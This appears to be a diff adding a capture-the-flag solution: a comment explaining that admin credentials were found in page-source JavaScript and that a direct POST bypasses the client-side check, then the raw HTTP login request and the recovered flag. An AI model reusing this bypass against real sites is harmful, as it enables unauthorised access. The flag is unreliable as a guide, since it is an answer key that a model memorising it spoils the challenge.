@@ -1,0 +1,8 @@
+# Credentials (admin/sup3rsecr3t) found in page source JavaScript. POST directly to index.php bypasses client-side JS check. Server returns flag{b91c5b74-4cbb-4d5f-ae31-1c673766c83a}
+
+POST /index.php HTTP/1.1
+Host: 172.17.0.1:48341
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+username=admin&password=sup3rsecr3t&login=login
